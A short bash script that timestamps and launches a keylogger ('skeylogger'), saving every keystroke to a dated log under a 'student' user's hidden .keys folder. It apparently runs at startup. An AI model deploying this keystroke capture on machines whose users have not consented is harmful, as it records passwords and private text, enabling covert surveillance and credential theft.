#!/bin/bash

d=`date +'%Y%m%d-%H%M%S'`
/usr/bin/simple-key-logger/skeylogger -l /home/student/.keys/$d.log

exit 0
